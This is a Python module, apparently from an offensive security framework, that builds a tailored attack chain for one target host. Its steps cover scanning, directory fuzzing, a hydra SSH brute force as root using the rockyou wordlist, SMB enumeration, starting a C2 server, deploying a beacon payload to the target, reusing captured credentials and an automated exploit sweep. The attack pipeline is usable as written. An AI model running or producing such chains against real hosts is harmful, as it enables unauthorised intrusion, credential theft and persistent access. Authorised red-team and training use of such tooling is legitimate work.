"""Runtime chain synthesis from fact-store evidence.

Builds a chain YAML tailored to one host: the shared kill-chain spine
(assign, one-shot scan with reuse, fact refresh, C2 surface, exploit
sweep, session report) plus service-aware steps derived from the
FactStore (gobuster for http, hydra for ssh, enum4linux for smb/rdp) and
an optional playbook binding. Output is validated with
``chain_registry.validate_chain`` before writing, so a generated file
never poisons the registry; the operator owns the file afterwards.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

from modules.chain_registry import validate_chain

_CHAIN_VERSION = 3
_NAME_RE = re.compile(r"[^a-z0-9_]+")
_PAYLOADE_PATH = Path(__file__).resolve().parent.parent / "payload.json"
_WORDLIST_FALLBACK = "/usr/share/wordlists/rockyou.txt"
_SLUG_PORT_TOKEN = "{port}"
_GEN_TAG = " (generated)"


def _slug(name: str) -> str:
    return _NAME_RE.sub("_", (name or "").strip().lower()).strip("_") or "target"


def _wordlist(param: str, fallback: str = _WORDLIST_FALLBACK) -> str:
    try:
        payload = json.loads(_PAYLOADE_PATH.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return fallback
    value = str(payload.get(param, "") or "").strip()
    return value or fallback


def _service_steps(host: str, services: list[dict]) -> list[dict]:
    """Build service-aware steps from open service facts."""
    steps: list[dict] = []
    seen: set[str] = set()
    for service in services:
        name = str(service.get("service", "")).lower()
        port = int(service.get("port", 0) or 0)
        if name == "http" and port and ("http", port) not in seen:
            seen.add(("http", port))
            steps.append(
                {
                    "id": f"http_enum_{port}",
                    "phase": "enum",
                    "description": f"Directory fuzz http on port {port}.",
                    "run": f"gobuster dir --url http://{host}:{port}/ --wordlist {{dir_wordlist}} -x .php,.html,.txt,.bak",
                    "timeout": 600,
                    "continue_on_error": True,
                }
            )
        elif name == "ssh" and ("ssh", 0) not in seen:
            seen.add(("ssh", 0))
            steps.append(
                {
                    "id": "ssh_bruteforce",
                    "phase": "cred",
                    "description": "Hydra against the ssh service.",
                    "run": f"hydra -t 4 -l {{username}} -P {{password_list}} ssh://{host}",
                    "timeout": 900,
                    "continue_on_error": True,
                }
            )
        elif name == "smb" or name == "cifs" or name == "microsoft-ds":
            if ("smb", 0) not in seen:
                seen.add(("smb", 0))
                steps.append(
                    {
                        "id": "smb_enum",
                        "phase": "enum",
                        "description": "Full smb enumeration with enum4linux.",
                        "run": f"enum4linux -a {host}",
                        "timeout": 900,
                        "continue_on_error": True,
                    }
                )
    return steps


def synth_chain_data(
    playbook: str,
    target: str,
    services: list[dict],
    has_creds: bool = False,
    os_hint: str = "",
    include_c2: bool = True,
) -> tuple[dict[str, Any], list[str]]:
    """Compose the chain dict for a host; (data, notes).

    Args:
        playbook: Playbook token to pin in defaults (enabled: false with '' value).
        target: Host the chain binds to.
        services: Open service dicts with service/port entries.
        has_creds: Whether credentials exist for the host already.
        os_hint: OS string from the fact store.
        include_c2: Whether C2 deploy/loot steps are included.
    """
    host = target.strip()
    name = f"apt_{_slug(playbook) or _slug(host)}_gen"
    defaults: dict[str, str] = {
        "playbook": playbook or "",
        "dir_wordlist": _wordlist("dirwordlist"),
        "password_list": _wordlist("passwordlist"),
        "username": "root",
    }
    steps: list[dict] = []
    steps.append(
        {
            "id": "scope",
            "phase": "recon",
            "description": "Bind the target this chain was generated for.",
            "run": f"assign target {host}",
        }
    )
    steps.append(
        {
            "id": "scan",
            "phase": "recon",
            "description": f"One-shot scan (reuse when sessions/scan_{host}.nmap.xml exists)."
            + (f" OS hint: {os_hint[:60]}." if os_hint else ""),
            "run": f"lazynmap {host}",
            "skip_if_exists": f"sessions/scan_{host}.nmap.xml",
            "timeout": 1800,
        }
    )
    steps.append(
        {
            "id": "facts_refresh",
            "phase": "recon",
            "description": "Re-ingest the scan into the fact store.",
            "run": f"python3 skills/lazyown_facts.py parse --target {host}",
            "continue_on_error": True,
        }
    )
    steps.append(
        {
            "id": "auto_populate",
            "phase": "recon",
            "description": "Mirror nmap XML into the world model.",
            "run": "auto_populate",
            "continue_on_error": True,
        }
    )
    steps.extend(_service_steps(host, services))
    if include_c2:
        steps.append(
            {
                "id": "surface",
                "phase": "postexp",
                "description": "Bring the C2 dashboard up for the operator.",
                "run": "c2_server start",
                "continue_on_error": True,
            }
        )
        steps.append(
            {
                "id": "beacon",
                "phase": "postexp",
                "description": "Deploy the beacon payload to the target.",
                "run": f"c2_deploy {host}",
                "continue_on_error": True,
            }
        )
    if has_creds:
        steps.append(
            {
                "id": "cred_reuse",
                "phase": "cred",
                "description": "Retry captured credentials across the service stack.",
                "run": f"createcredentials {host}",
                "continue_on_error": True,
            }
        )
    steps.append(
        {
            "id": "exp_sweep",
            "phase": "exploit",
            "description": "Atomic sweep driven by the scan XML triggers.",
            "run": f"python3 modules/atomic_exploit_bridge.py auto --target {host} --max-attempts 8",
            "timeout": 1800,
        }
    )
    if playbook:
        steps.append(
            {
                "id": "playbook_validate",
                "phase": "exploit",
                "description": f"Validate the {playbook} playbook.",
                "run": f"apt_playbook validate {playbook}",
                "continue_on_error": True,
            }
        )
    steps.append(
        {
            "id": "session_report",
            "phase": "report",
            "description": "Refresh the session report surfaces.",
            "run": "create_session_json",
            "continue_on_error": True,
            "sinks": ["world_model", "killchain", "report"],
        }
    )
    data: dict[str, Any] = {
        "name": name,
        "description": f"Synthesised APT chain for {host}{_GEN_TAG}",
        "enabled": True,
        "platforms": ["linux", "windows"],
        "defaults": defaults,
        "steps": steps,
        "total_timeout": 7200,
    }
    return data, [f"service step for {name}:{int(s.get('port', 0))}" for s in services if s.get("port")]


def facts_for_target(target: str) -> dict[str, Any]:
    """Pull host facts from the FactStore for synthesis inputs.

    Returns:
        {services: [...], has_creds: bool, os_hint: str} — empty services
        when nothing about the target is known.
    """
    try:
        from skills.lazyown_facts import FactStore

        store = FactStore()
        store.parse_all(target)
        host_facts = store.get_host(target)
    except Exception:
        return {"services": [], "has_creds": False, "os_hint": ""}
    if host_facts is None:
        return {"services": [], "has_creds": False, "os_hint": ""}
    services = [
        {"service": s.service, "port": int(s.port), "product": s.product, "version": s.version}
        for s in host_facts.services
        if s.state == "open" and int(s.port) >= 1
    ]
    return {
        "services": services,
        "has_creds": bool(host_facts.credentials),
        "os_hint": str(host_facts.os_hint or ""),
    }


def write_generated_chain(
    data: dict[str, Any],
    chains_dir: Path | str | None = None,
) -> tuple[Path | None, list[str]]:
    """Validate and persist the generated chain file; returns (path, errors).

    Invalid data is never written: errors come back instead either way.
    """
    name = str(data.get("name", "") or "")
    errors = validate_chain(data, filename=name, chains_dir=chains_dir)
    if errors:
        return None, errors
    file_path = Path(chains_dir) / f"{name}.yaml"
    file_path.parent.mkdir(parents=True, exist_ok=True)
    try:
        import yaml

        file_path.write_text(yaml.safe_dump(data, sort_keys=False, allow_unicode=True), encoding="utf-8")
    except (OSError, ImportError):
        return None, ["unable to write generated chain file"]
    return file_path, []
